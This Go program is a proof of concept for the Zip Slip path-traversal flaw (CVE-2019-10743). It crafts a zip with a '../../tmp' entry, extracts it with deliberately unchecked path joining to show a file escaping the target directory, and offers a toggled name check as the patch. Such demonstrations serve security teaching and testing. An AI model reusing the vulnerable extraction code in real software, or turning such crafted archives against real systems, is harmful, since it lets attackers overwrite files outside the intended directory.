package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

var patched bool

func main() {
	if len(os.Args) > 1 && os.Args[1] == "fixed" {
		patched = true
	}

	// Step 1: build a malicious zip with a traversal entry
	buf := new(bytes.Buffer)
	zw := zip.NewWriter(buf)
	fw, _ := zw.Create("../../tmp/evil-pwned.txt")
	fw.Write([]byte("ZIP SLIP SUCCESS - file written outside target dir!\n"))
	zw.Close()
	os.WriteFile("/tmp/malicious.zip", buf.Bytes(), 0644)

	// clean slate
	os.RemoveAll("/tmp/extract")
	os.Remove("/tmp/evil-pwned.txt")

	mode := "VULNERABLE (no path check)"
	if patched {
		mode = "PATCHED (path sanitization enabled)"
	}
	fmt.Printf("=== CVE-2019-10743 PoC: Zip Slip — %s ===\n", mode)
	fmt.Println("Malicious zip entry: ../../tmp/evil-pwned.txt")
	fmt.Println("Extracting to: /tmp/extract")
	fmt.Println()

	// Step 2: extract using archive/zip (standard library, no built-in check)
	r, err := zip.OpenReader("/tmp/malicious.zip")
	if err != nil {
		fmt.Println("open zip error:", err)
		os.Exit(1)
	}
	defer r.Close()

	for _, f := range r.File {
		// --- this is the vulnerable line ---
		target := filepath.Join("/tmp/extract", f.Name)

		// --- patch: sanitize path before joining ---
		if patched {
			if strings.Contains(f.Name, "..") || filepath.IsAbs(f.Name) {
				fmt.Printf("[BLOCKED] traversal entry rejected: %s\n", f.Name)
				continue
			}
			target = filepath.Join("/tmp/extract", f.Name)
		}

		if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil {
			fmt.Println("mkdir error:", err)
			continue
		}
		out, err := os.Create(target)
		if err != nil {
			fmt.Println("create error:", err)
			continue
		}
		rc, _ := f.Open()
		io.Copy(out, rc)
		rc.Close()
		out.Close()
		fmt.Printf("[extracted] %s -> %s\n", f.Name, target)
	}

	// Step 3: verify
	fmt.Println()
	if data, err := os.ReadFile("/tmp/evil-pwned.txt"); err == nil {
		fmt.Println("[RESULT] File written OUTSIDE /tmp/extract:")
		fmt.Println("  /tmp/evil-pwned.txt => " + string(data))
	} else {
		fmt.Println("[RESULT] No file escaped target directory (traversal blocked)")
	}
}
